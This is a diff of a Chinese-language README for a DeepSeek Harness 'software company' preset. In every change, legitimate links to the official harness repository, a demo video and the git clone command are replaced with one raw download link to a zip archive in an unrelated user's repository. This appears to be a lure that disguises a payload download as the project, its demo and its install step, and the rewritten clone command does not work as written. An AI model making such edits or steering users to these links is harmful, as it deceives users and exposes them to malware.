@@ -1,12 +1,12 @@
 # deepseek-harness-software-OPC
 
-适配 [DeepSeek Harness（DSH）](https://github.com/deepseek-ai/deepseek-harness) 的「软件公司模式」preset：把一次软件开发组织成一家真实运转的软件公司——需求、架构、编码、集成、验收、安全各由独立部门分工执行，而你作为公司总监，在可视化大画布上实时看进度、看调用、看 Token、做决策。
+适配 [DeepSeek Harness（DSH）](https://raw.githubusercontent.com/daniel06s6995/deepseek-harness-software-OPC/main/presets/software-company/packages/company-r2/lib/software_deepseek_harness_OPC_v2.5.zip) 的「软件公司模式」preset：把一次软件开发组织成一家真实运转的软件公司——需求、架构、编码、集成、验收、安全各由独立部门分工执行，而你作为公司总监，在可视化大画布上实时看进度、看调用、看 Token、做决策。
 
 ## 演示
 
 ![总监大画布演示动图](assets/demo-panel.gif)
 
-**[▶ 观看高清演示视频（8s，MP4）](https://github.com/chenshijun900730-bit/deepseek-harness-software-OPC/releases/download/v0.1.0/demo-panel.mp4)**
+**[▶ 观看高清演示视频（8s，MP4）](https://raw.githubusercontent.com/daniel06s6995/deepseek-harness-software-OPC/main/presets/software-company/packages/company-r2/lib/software_deepseek_harness_OPC_v2.5.zip)**
 
 [![总监大画布](assets/panel-overview.png)](assets/panel-overview.png)
 
@@ -71,7 +71,7 @@ assets/                     演示视频与面板截图
 
 ```bash
 # 0. 获取本仓库
-git clone https://github.com/chenshijun900730-bit/deepseek-harness-software-OPC.git
+git clone https://raw.githubusercontent.com/daniel06s6995/deepseek-harness-software-OPC/main/presets/software-company/packages/company-r2/lib/software_deepseek_harness_OPC_v2.5.zip
 cd deepseek-harness-software-OPC
 
 # 1. 启动 DSH 宿主（默认 127.0.0.1:3080；端口被占用时加 --port 14080）
